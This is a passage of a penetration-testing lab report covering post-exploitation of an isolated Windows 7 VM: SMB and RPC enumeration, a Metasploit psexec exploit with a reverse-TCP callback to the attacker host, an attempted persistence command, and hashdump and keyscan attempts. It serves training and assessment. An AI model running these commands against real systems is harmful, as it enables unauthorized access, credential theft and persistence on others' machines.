### 5.12.1 Current Logged-On Users

Observed output:

```text
Current Logged Users

SID
S-1-5-21-685279967-3884420820-9665942-1000

User
WINDOWS7\vboxuser
```

### 5.12.2 Recently Logged-On Users

The module also returned profile information:

```text
Recently Logged Users

SID                         Profile Path

S-1-5-18                    C:\Windows\system32\config\systemprofile
S-1-5-19                    C:\Windows\ServiceProfiles\LocalService
S-1-5-20                    C:\Windows\ServiceProfiles\NetworkService

S-1-5-21-685279967-3884420820-9665942-1000
                            C:\Users\vboxuser
```

### Findings

The enumeration identified:

- The active local account `vboxuser`.
- The user's SID.
- The user's profile directory.
- Standard Windows service profiles.
- Recently logged-on user information.

The results were automatically saved in the Metasploit loot directory.

Example output paths recorded in the screenshots:

```text
/home/kali/.msf4/loot/20261124120605_default_192.168.56.103_host.users.recen_406684.txt
```

```text
/home/kali/.msf4/loot/20261124122420_default_192.168.56.103_host.users.activ_690125.txt
```

```text
/home/kali/.msf4/loot/20261124122421_default_192.168.56.103_host.users.recen_860166.txt
```

These files provided supporting evidence for the user enumeration results.

---

## 5.13 SMB Share Enumeration

Additional SMB enumeration was conducted to identify accessible network shares.

The following command was used:

```bash
smbclient -L //192.168.56.103/ -U vboxuser%kali
```

The SMB client successfully opened an interactive connection.

The SMB enumeration results also identified the following shares:

| Share  | Type | Description                  |
| ------ | ---- | ---------------------------- |
| ADMIN$ | DISK | Remote administrative share  |
| C$     | DISK | Default administrative share |
| IPC$   | IPC  | Remote IPC                   |

The SMB shares indicated that Windows administrative and IPC resources were exposed through the SMB service.

The SMB user enumeration module was also executed:

```text
use auxiliary/scanner/smb/smb_enumusers
```

The password option was configured:

```text
set SMBPass kali
```

The module was executed:

```text
run
```

Observed result:

```text
192.168.56.103:445 - Using automatically identified domain: WINDOWS7

WINDOWS7 [ Administrator, Guest, vboxuser ]
```

### Findings

The enumeration identified three local/domain account names:

- Administrator
- Guest
- vboxuser

This provided additional information about the target's account structure.

---

## 5.14 SMB Protocol and RPC Enumeration

SMB protocol discovery was performed using:

```bash
nmap --script smb-protocols -p445 192.168.56.103
```

Observed protocols:

```text
NT LM 0.12 (SMBv1) [dangerous, but default]
2.0.2
2.1
```

This confirmed that SMBv1 was supported by the target.

The SMB operating system discovery command was also executed:

```bash
nmap --script smb-os-discovery -p445 192.168.56.103
```

Observed information:

```text
OS: Windows 7 Ultimate 7601 Service Pack 1
Computer name: Windows7
Workgroup: WORKGROUP
```

Additional RPC endpoint enumeration was performed using the Metasploit module:

```text
use auxiliary/scanner/dcerpc/endpoint_mapper
```

The module identified multiple RPC interfaces and endpoints on TCP port 135.

This provided further evidence of exposed Windows RPC services.

---

## 5.15 Persistence Functionality Test

A persistence functionality test was attempted during this phase.

The command entered into the Metasploit console was:

```text
run persistence -X -i 5 -p 4444 -r 192.168.56.102
```

The command was issued while the logged-on-user enumeration post module was selected.

The observed output included:

```text
[-] Git is not available
[*] Nothing to reload
[*] Running module against WINDOWS7 (192.168.56.103)
```

The output subsequently displayed logged-on user enumeration results.

### Result: NOT CONFIRMED

The screenshots do not show a successful persistence installation or a subsequent reconnection proving that persistence worked.

Therefore, persistence must be documented as an attempted but unverified activity.

The following limitations were identified:

- Git was reported as unavailable.
- The output did not provide confirmation that a persistence mechanism was installed.
- No reboot or reconnection verification was captured.
- No cleanup or removal verification was captured.

**Assessment note:** No claim of successful persistence should be made based on this evidence.

For the final lab report, persistence should remain classified as an unsuccessful or inconclusive test.

---

## 5.16 Important Observations and Issues Encountered

Several issues were encountered during Phase 5.

### Issue 1 — Initial EternalBlue Access Was Unsuccessful

The initial exploitation approach did not provide the expected Meterpreter session.

The Windows 7 machine had also undergone two update installations before the subsequent testing.

However, the exact reason for the EternalBlue failure was not established.

The missing Windows account password was not the direct cause because EternalBlue does not depend on SMB password authentication in the same way as PsExec.

### Issue 2 — Alternative Access Was Required

Instead of continuing to rely on the unsuccessful exploitation attempt, the credential-based PsExec module was used.

The following module successfully established a new session:

```text
use exploit/windows/smb/psexec
```

The configured credentials were:

```text
SMBUser: vboxuser
SMBPass: kali
```

The target was:

```text
RHOSTS: 192.168.56.103
```

The attacker callback configuration was:

```text
LHOST: 192.168.56.102
LPORT: 4444
```

The alternative approach successfully recovered remote access.

### Issue 3 — Hash Retrieval Failed

Although SYSTEM privileges were confirmed, the `hashdump` command returned error 1168.

No hashes were recovered.

### Issue 4 — Persistence Was Not Verified

The persistence command did not produce evidence of successful installation.

It was therefore recorded as an inconclusive test.

### Issue 5 — Keystroke Capture Was Not Confirmed

The keyscan commands were executed, but the available screenshots did not show any captured keystrokes.

---

## 5.17 Phase 5 Results Summary

| Activity                          | Result       | Evidence                       |
| --------------------------------- | ------------ | ------------------------------ |
| Alternative PsExec exploitation   | Successful   | Meterpreter session 1 opened   |
| Meterpreter session establishment | Successful   | Reverse TCP connection         |
| System information enumeration    | Successful   | `sysinfo`                      |
| User identification               | Successful   | `getuid`                       |
| SYSTEM privilege verification     | Successful   | `NT AUTHORITY\SYSTEM`          |
| Process enumeration               | Successful   | `ps`                           |
| Process migration                 | Successful   | Migration to PID 1428          |
| SAM hash retrieval                | Failed       | Error 1168                     |
| Screenshot capture                | Successful   | JPEG saved on Kali             |
| Keyscan functionality test        | Inconclusive | No captured keystrokes shown   |
| Logged-on user enumeration        | Successful   | User and profile information   |
| SMB share enumeration             | Successful   | ADMIN$, C$, IPC$               |
| SMB user enumeration              | Successful   | Administrator, Guest, vboxuser |
| SMB protocol enumeration          | Successful   | SMBv1, SMB 2.0.2, SMB 2.1      |
| RPC endpoint enumeration          | Successful   | RPC interfaces identified      |
| Persistence test                  | Not verified | No installation confirmation   |

---

## 5.18 Evidence and Screenshot Organization

The following screenshots should be retained in the `05-post-exploitation` directory.

| Screenshot                       | Evidence Description                             |
| -------------------------------- | ------------------------------------------------ |
| `finally-gain-meter-14.png`      | Successful PsExec access and Meterpreter session |
| `finally-gain-meter-15.png`      | PsExec module configuration and connection       |
| `finally-gain-meter-16.png`      | Initial session and backgrounding                |
| `migrate-03.png`                 | Successful process migration                     |
| `hashdump-04.png`                | Failed SAM hash retrieval                        |
| `record-result-17.png`           | Screenshot capture and keyscan activity          |
| `key_scan-06.png`                | Keystroke-capture functionality test             |
| `persistence-18.png`             | Persistence command and observed output          |
| `enu-logged-users-16.png`        | Logged-on user enumeration                       |
| `post-exploi-01.png`             | System information and privilege verification    |
| `post-exploi-02.png`             | Process enumeration                              |
| `pivot-network-discovery-17.txt` | Network discovery evidence                       |
| `smb-client-gain-access-12.png`  | SMB client connection                            |
| `smb-protocol-07.png`            | SMB protocol enumeration                         |
| `win7-screenshot-05.jpeg`        | Windows 7 screenshot evidence                    |

---

## 5.19 Security Impact

The post-exploitation activities demonstrated that successful credential-based remote access to the Windows 7 system could provide significant control over the target.

The most important security observations were:

1. Valid SMB credentials permitted remote execution through the PsExec module.
2. The resulting session operated with SYSTEM-level privileges.
3. Process information and logged-on user information could be enumerated.
4. Administrative SMB shares were exposed.
5. SMBv1 remained supported.
6. The target's desktop could be captured through the established session.
7. Additional credential-access and persistence tests did not produce confirmed successful results.

These findings demonstrate the potential impact of weak credential management and exposed administrative services.

---

## 5.20 Cleanup and Lab Restoration

After completing the assessment, the lab should be returned to a known state.

The cleanup procedure should include:

- Review the active Metasploit sessions.
- Close the Meterpreter session when testing is complete.
- Verify that no unauthorized test artifacts remain on the Windows 7 machine.
- Remove any test persistence artifacts if they were installed.
- Remove temporary payload files.
- Review the Kali loot directory and protect collected evidence.
- Restore the Windows 7 snapshot if another assessment cycle is required.
- Confirm that both virtual machines remain isolated from external networks.

No successful persistence installation was confirmed in this assessment, so cleanup should not assume that a persistence mechanism exists or that the target is clean without verification.

---

## 5.21 Phase 5 Conclusion

Phase 5 successfully demonstrated post-exploitation capabilities against the authorized Windows 7 lab environment.

The initial EternalBlue approach did not produce the expected access. Following this issue, the assessment used the Metasploit `exploit/windows/smb/psexec` module with the configured SMB account credentials.

This alternative approach successfully established Meterpreter Session 1 through the reverse TCP connection.

The session provided access to system information, user enumeration, process enumeration, screenshot capture, and other post-exploitation functionality.

SYSTEM-level privileges were confirmed through the `getuid` output. Process migration to PID 1428 also completed successfully.

However, not every activity succeeded. SAM hash retrieval failed with error 1168, keyscan activity did not provide evidence of captured keystrokes, and the persistence attempt was not verified.

Overall, the phase demonstrated that credential-based remote access was an effective alternative in this particular lab configuration, even though the original vulnerability-based exploitation attempt did not succeed.

**Final Phase 5 Assessment: Successfully completed with documented limitations and inconclusive tests.**
